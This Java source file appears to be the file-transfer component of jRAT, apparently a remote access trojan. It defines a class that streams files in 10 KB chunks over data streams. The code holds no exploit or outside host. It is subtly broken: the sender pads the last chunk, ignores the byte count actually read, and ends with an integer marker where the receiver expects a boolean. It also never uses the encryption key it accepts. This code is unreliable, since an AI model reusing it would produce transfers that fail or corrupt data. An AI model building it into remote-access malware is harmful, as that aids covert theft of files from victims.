package pro.jrat.common.io;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;


public class FileIO {
	
	public static final int CHUNKSIZE = 1024 * 10;

	public boolean enabled = true;
	
	public void writeFile(File file, DataOutputStream dos, DataInputStream dis, TransferListener listener, byte[] key) throws Exception {
		FileInputStream fileInput = new FileInputStream(file);		
		
		byte[] chunk = new byte[CHUNKSIZE];

		long fileSize = file.length();
		dos.writeLong(fileSize);

		for (long pos = 0; pos < fileSize; pos += CHUNKSIZE) {
			if (enabled) {
				dos.writeBoolean(true);
			} else {
				dos.writeBoolean(false);
				fileInput.close();
				return;
			}
			
			fileInput.read(chunk);
		
			dos.writeInt(chunk.length);
			dos.write(chunk, 0, chunk.length);
			
			if (listener != null) {
				listener.transferred(chunk.length, pos, fileSize);
			}
		}
		dos.writeInt(-1);
		fileInput.close();
	}

	public void readFile(File output, DataInputStream dis, DataOutputStream dos, TransferListener listener, byte[] key) throws Exception {
		FileOutputStream fileOutput = new FileOutputStream(output);

		int read = 0;
		int chunkSize;
		
		long size = dis.readLong();
		
		while (dis.readBoolean()) {
			chunkSize = dis.readInt();
			
			byte[] chunk = new byte[chunkSize];

			read += chunkSize;

			dis.readFully(chunk);
						
			fileOutput.write(chunk);
			
			if (listener != null) {
				listener.transferred(chunk.length, read, size);
			}
		}
		
		fileOutput.close();

	}

}
